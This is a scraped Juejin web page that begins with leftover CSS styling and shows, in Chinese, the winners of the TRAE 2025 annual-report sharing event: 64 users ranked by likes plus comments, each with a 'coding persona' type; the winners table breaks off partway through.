W6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtxieM5wyIhq5GskMNpidN7oJV2LzqTn0qvol+jDxvrGYcZS4z3GncZjJpYmCSYrTRpNnpgSTRmmmaZbTNtNh82MzKLMis3qzR6aE8wZ5nzzbeYd5qMWlhZJFqstmi0GLbUtWZZFlvWWj60oVn5W+Va1VnessdYM6xzrndZdNrCNmw3fpsbmli1s624rsN1p222HsfO0E9rV2t2zJ9sz7Qvt6+37HGgOkQ4rHZod3kw3m546fdP0junfHd0ccx33OT5y0nAKd1rp1Or0ztnGmeNc43zHheIS4rLMpcXlrautK891l+t9N6pblNtqt3a3b+4e7mL3BvchDzOPdI8dHvcYmowYxjrGVU+MZ4DnMs8znp+93L0KvE54/eFt753jfdh7cIblDN6MfTP6fUx82D57fGS+dN903598ZX7Gfmy/Wr9n/qb+XP8D/i+Y1sxs5hHmmwDHAHHAqYDRQK/AJYFtQaig0KCyoM5gjeCE4OrgpyEmIVkh9SHDoW6hi0PbwjBhEWGbwu6xDFgcVh1rONwjfEn4pQhyRFxEdcSzSJtIcWRrFBwVHrU56vFM85nCmc3RIJoVvTn6SYxlTH7ML7Ows2Jm1cx6HusUWxzbEUeNmxd3OO5jfED8hvhHCVYJ0oT2RNXEtMS6xNGkoKSKJFny9OQlyTdSdFMEKS2puNTE1AOpI7ODZ2+dPZDmllaadneO5ZyFc67N1Z2bO/fsPNV57Hkn0zHpSemH07+yo9m17JEMVsaOjGFOIGcb5xXXn7uFO8Tz4VXwXmT6ZFZkDmb5ZG3OGuL78Sv5rwWBgmrB2+yw7N3ZoznROQdz5LlJuY15+Lz0vNNCDWGO8NJ8w/kL53eLbEWlIlm+V/7W/GFxhPiABJLMkbQUaCIi6abUSvqDtK/Qt7Cm8NOCxAUnF6ovFC68uchm0dpFL4pCivYvRi/mLG4vNi5eUdy3hLlkz1JoacbS9mWmy0qWDSwPXX5oBXFFzopfVzqurFj5YVXSqtYSg5LlJf0/hP5QX6pSKi69t9p79e416DWCNZ1rXdZuX/u9jFt2vdyxvLL86zrOuus/Ov1Y9aN8feb6zg3uG3ZtxG4Ubry7yW/ToQr1iqKK/s1Rm5u20LeUbfmwdd7Wa5Wulbu3EbdJt8mqIqtatptt37j9azW/urcmoKZxh/6OtTtGd3J39uzy39Ww22B3+e4vPwl+ur8ndE9TrUVt5V7s3sK9z/cl7uvYz9hfd0D3QPmBbweFB2WHYg9dqvOoqzusf3hDPVwvrR86knak62jQ0ZYG+4Y9jbTG8mPgmPTYy+Ppx++eiDjRfpJxsuFn8593nKKeKmuCmhY1DTfzm2UtKS3dp8NPt7d6t576xeGXg2eMz9Sc1Tq74RzxXMk5+fmi8yNtorbXF7Iu9LfPa390MfninUuzLnVejrh89UrIlYsdzI7zV32unrnmde30dcb15hvuN5puut089avbr6c63Tubbnncauny7GrtntF9rsev58LtoNtX7rDu3Oid2dt9N+Hu/Xtp92T3ufcHH+Q+ePuw8OHYo+WPMY/Lnqg9qXyq/7T2N+vfGmXusrN9QX03n8U9e9TP6X/1u+T3rwMlzynPK18YvagbdB48MxQy1PVy9suBV6JXY69L/6H+jx1vrN78/If/HzeHk4cH3orfyt+te6/z/uAH1w/tIzEjTz/mfRwbLfuk8+nQZ8bnji9JX16MLfiK+1r1zfpb6/eI74/leXK5iC1mj0sBFDLgzEwA3h1EtHEKAFRElxNnT2jrcYMmvgfGCfwnntDf4+YOQAMyKWQR0x+Akwo5i8wqyKyQRPH+AHZxUY5/mSTTxXkiFxlRlphPcvl7AwBwrQB8E8vlYzvl8m/7kGIfANCWP6HpFYZFtHyD3vJRg6LbPe3g7zah9//U499noKjAFfx9/ieoZhkWVvYkwwAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAEKgAwAEAAAAAQAAAEIAAAAAgodoEQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAABMtJREFUeAHtXM2KFDEQzrQKruIu4mEXRFlUVLz4A4K7B99AcO8io0/gwQfxDVzFuwu+gQf34EG8iOAPKAh6EFlBFMSf/qa2uqszlVR6ZtYxM5PDJNVVSer78nU6KrHzpyxuVlwx44AY2O0T8eb9D7f5fMu9fPvdff7y0/36nbdgdhUdd+jgHnf62JxbObvgjh/d60Pu2R35ajx49Mk9frqlBk7Kw8sXF9y1K4t9cCoi7tz/4F68/tYXMIkPzpzY725dP9yA1tsjoIRpIQHogRWYZSmwJ4Reh06nI2Nd7rYEA8zAzqXAxhgq/pc1d9vHKbEX+Dr4JbzypJDc/YxXYi/wifRLeOXpU5q7n/FK7EXsnBBeeRoqd7/EHj1ZhleeiMjdz8pArRKR+0pb+UsCuK0SkftKW/kzeFmrRHCAxWzufsaJOkqExWzufpOI8EpP1jnCJCK80pN1jjCJ4ICwMigidz/jRD3bI7bZUInIfaWt/KUSuK0SEd4jqFvufgYva5UIDrCYzd3POFFHifhfV/7k8lwPw7D5mUSEV3r854ju2pK7ffOIWzk/X+Go803Lr+ooGqoiwkyP9xzRXVt0q9sE3CgJYTLqfNPyE/irpkoEe2um6ck4bSiBSeD8JBl41jY/Hgd1lIiaaeoyLlsjgUGAjEH3DB4DtUpEW2Z3Mj5GAgA8efbVvXpX/200nln5IMYvKhHDrvylcwdc9+pSNdeg46WQsP7wo2s7fpWYaPT926fw9ZiVk4BpywYJkGuvlJs4EuWS0p/HTyHh3kbzH2najM85cR0lgpPiYMtukFB26m1u5Ua+vkFkWP3Zn0KCJDg1Px6f42Wtvhrhdyz8ncanrFKCmGH1wrwDMCrh/uxPIUFTAvdHbeVPsc1fVRE+c7Ud/k6fWt7XHFlYqcqQ5wTRvWpiY4wrIZwfDUL+akDRUBXB/jCzFCH9SHCzTDRUmsro7z+cEvrHwxOZn2ZTL/pVFcEBtRLoiWXfxQ5ehvoHHx4vpIwUEuJKSMvPz5/zQq0qwmIy5m+rjBQSwnsCQYnlgwjfT72av6oifOba2qnKcOXeGVIP0rT3BALTNr8mBWSpRHAgmJSTtLGhDHwj+A9GPCbX2DNiBSRoShg0H8zl5y/njxIhJ0WntralDJmIbO+UEvz85Zwt9wj7HIDB5Ttp7RkyGbRDSqC49vOjX50P9aexmr+qInzmajvtO13H02SpyrCVMNj8dT7/4BwByDXzRIC0LWXEldA/njVfip9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f07dbb3a2df4091aa1c90d82190df0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768292106&amp;x-signature=ZiIHWGF2TO6SUIWkc8atN7J76UI%3D" alt="沸点圈子.png" loading="lazy"/></p>
<p><strong>亲爱的掘友们，TRAE 2025 年度报告分享活动已圆满落幕！</strong></p>
<p>特别感谢每一位在 <a href="https://juejin.cn/pin/topic/7587524867952476206" target="_blank" title="https://juejin.cn/pin/topic/7587524867952476206">#TRAELAND#</a> 话题下晒出年度报告、解锁隐藏编码人格的你。</p>
<p>你们的硬核数据、脑洞创意和真实感悟，让整个活动既满是技术温度，又充满互动乐趣～</p>
<p>每一份分享都是TRAE 1.0.0 的年度纪念 🌟</p>
<p>经过数据统计与合规审核，获奖名单终于揭晓！快来看看谁能将 TRAE 定制周边年终奖抱回家！</p>
<h2 data-id="heading-0">获奖名单</h2>
<p>本次活动按参赛沸点「点赞数 + 评论数」总和排名，同一用户以数据最优作品参与评选，最终确定 64 名获奖者。</p>
<p>完整获奖名单⬇️</p>











































































































































































































<table><thead><tr><th><strong>作者</strong></th><th><strong>角色类型</strong></th><th><strong>作者</strong></th><th><strong>角色类型</strong></th></tr></thead><tbody><tr><td><a href="https://juejin.cn/user/3140624091453053" target="_blank" title="https://juejin.cn/user/3140624091453053">大模型真好玩</a></td><td>持灯者</td><td><a href="https://juejin.cn/user/2546902679956407" target="_blank" title="https://juejin.cn/user/2546902679956407">什么时候能中奖</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/1269294586664749" target="_blank" title="https://juejin.cn/user/1269294586664749">LucianaiB</a></td><td>起源者</td><td><a href="https://juejin.cn/user/2349023906759447" target="_blank" title="https://juejin.cn/user/2349023906759447">笨提莫</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/712139266070525" target="_blank" title="https://juejin.cn/user/712139266070525">akatsuki00</a></td><td>心流狙击手</td><td><a href="https://juejin.cn/user/3034307824727950" target="_blank" title="https://juejin.cn/user/3034307824727950">前端赵哈哈</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/26044011388510" target="_blank" title="https://juejin.cn/user/26044011388510">不如摸鱼去</a></td><td>心流狙击手</td><td><a href="https://juejin.cn/user/3245414491884253" target="_blank" title="https://juejin.cn/user/3245414491884253">xyy</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/3931509312987511" target="_blank" title="https://juejin.cn/user/3931509312987511">zhouzhouya</a></td><td>探索家</td><td><a href="https://juejin.cn/user/4420500273769767" target="_blank" title="https://juejin.cn/user/4420500273769767">不懂就去问</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/4355590446148836" target="_blank" title="https://juejin.cn/user/4355590446148836">人参无肠</a></td><td>未明确</td><td><a href="https://juejin.cn/user/3403743731657982" target="_blank" title="https://juejin.cn/user/3403743731657982">ethan_Yin</a></td><td>探索家</td></tr><tr><td><a href="https://juejin.cn/user/2559318797856664" target="_blank" title="https://juejin.cn/user/2559318797856664">Goooooooooooooooooda</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2344586853496814" target="_blank" title="https://juejin.cn/user/2344586853496814">苏州第一深情</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/2023560267436312" target="_blank" title="https://juejin.cn/user/2023560267436312">ApeAssistant</a></td><td>节奏大师</td><td><a href="https://juejin.cn/user/1638743356481367" target="_blank" title="https://juejin.cn/user/1638743356481367">阿橙的百宝箱</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/84028728031976" target="_blank" title="https://juejin.cn/user/84028728031976">郝同学的测开笔记</a></td><td>未明确</td><td><a href="https://juejin.cn/user/553809592464951" target="_blank" title="https://juejin.cn/user/553809592464951">前端情报社</a></td><td>起源者</td></tr><tr><td><a href="https://juejin.cn/user/4353721778321800" target="_blank" title="https://juejin.cn/user/4353721778321800">Tinyo</a></td><td>起源者</td><td><a href="https://juejin.cn/user/1787141123213984" target="_blank" title="https://juejin.cn/user/1787141123213984">河海洋</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1066964360895579" target="_blank" title="https://juejin.cn/user/1066964360895579">碳水重度爱好者</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/2330620381913821" target="_blank" title="https://juejin.cn/user/2330620381913821">TonyLiu</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/3048261967153544" target="_blank" title="https://juejin.cn/user/3048261967153544">PBitW</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3087084378402445" target="_blank" title="https://juejin.cn/user/3087084378402445">陈佬昔编程人生</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/4424901849255742" target="_blank" title="https://juejin.cn/user/4424901849255742">小猴子吖</a></td><td>起源者</td><td><a href="https://juejin.cn/user/571401779029966" target="_blank" title="https://juejin.cn/user/571401779029966">查拉图斯特拉说</a></td><td>未明确</td></tr><tr><td><a href="https://juejin.cn/user/816265914492889" target="_blank" title="https://juejin.cn/user/816265914492889">之维</a></td><td>起源者</td><td><a href="https://juejin.cn/user/1222312659548446" target="_blank" title="https://juejin.cn/user/1222312659548446">围巾哥萧尘</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/1989458366301708" target="_blank" title="https://juejin.cn/user/1989458366301708">是你的小橘呀</a></td><td>执剑人</td><td><a href="https://juejin.cn/user/17205727081735" target="_blank" title="https://juejin.cn/user/17205727081735">南瓜大校</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/2189882892232029" target="_blank" title="https://juejin.cn/user/2189882892232029">王中阳讲AI编程</a></td><td>创世神</td><td><a href="https://juejin.cn/user/796483469196136" target="_blank" title="https://juejin.cn/user/796483469196136">打不过老婆的赛亚人</a></td><td>创世神</td></tr><tr><td><a href="https://juejin.cn/user/4213783314836030" target="_blank" title="https://juejin.cn/user/4213783314836030">雷电大法王</a></td><td>创世神</td><td><a href="https://juejin.cn/user/3109843365802925" target="_blank" title="https://juejin.cn/user/3109843365802925">天天摸鱼的java工程师</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1961991576240190" target="_blank" title="https://juejin.cn/user/1961991576240190">初辰ge</a></td><td>创世神</td><td><a href="https://juejin.cn/user/308305165032071" target="_blank" title="https://juejin.cn/user/308305165032071">kunLoong</a></td><td>探索家</td></tr><tr><td><a href="https://juejin.cn/user/2700056290397623" target="_blank" title="https://juejin.cn/user/2700056290397623">英文字母不好中</a></td><td>创世神</td><td><a href="https://juejin.cn/user/2186244473229768" target="_blank" title="https://juejin.cn/user/2186244473229768">番茄不红就是酸</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1063982986187486" target="_blank" title="https://juejin.cn/user/1063982986187486">一点一木</a></td><td>起源者</td><td><a href="https://juejin.cn/user/3457290274345454" target="_blank" title="https://juejin.cn/user/3457290274345454">用户4731209378721</a></td><td>执剑人</td></tr><tr><td><a href="https://juejin.cn/user/1346244869364782" target="_blank" title="https://juejin.cn/user/1346244869364782">思乡码农</a></td><td>起源者</td><td><a href="https://juejin.cn/user/726098270497661" target="_blank" title="https://juejin.cn/user/726098270497661">花卷小弟</a></td><td>心流狙击手</td></tr><tr><td><a href="https://juejin.cn/user/571401777200855" target="_blank" 